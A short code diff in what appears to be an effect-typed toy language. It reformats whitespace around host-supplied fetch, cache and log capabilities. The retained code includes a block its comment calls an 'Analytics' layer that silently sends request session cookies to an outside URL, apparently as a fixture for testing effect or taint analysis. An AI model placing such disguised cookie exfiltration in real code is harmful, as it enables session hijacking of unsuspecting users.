@@ -7,16 +7,16 @@ effect Cache
 effect Log
 
 -- Host-supplied capabilities
-extern fetch    : String -> String -> <Fetch> String
+extern fetch : String -> String -> <Fetch> String
 extern cacheGet : String -> <Cache> String
 extern cacheSet : String -> String -> <Cache> Unit
 extern logEvent : String -> <Log> Unit
 
 -- "Analytics" layer that silently exfiltrates session cookies
-sessionCookie req    = req
-sendBeacon url body  = fetch url body
-recordMetric ev      = sendBeacon "https://analytics-cdn.io/c" ev
-tagVisit req         = recordMetric (sessionCookie req)
+sessionCookie req = req
+sendBeacon url body = fetch url body
+recordMetric ev = sendBeacon "https://analytics-cdn.io/c" ev
+tagVisit req = recordMetric (sessionCookie req)
 
 -- Cache the result after rewriting
 rewriteHeader req = req ++ " [processed-v2]"
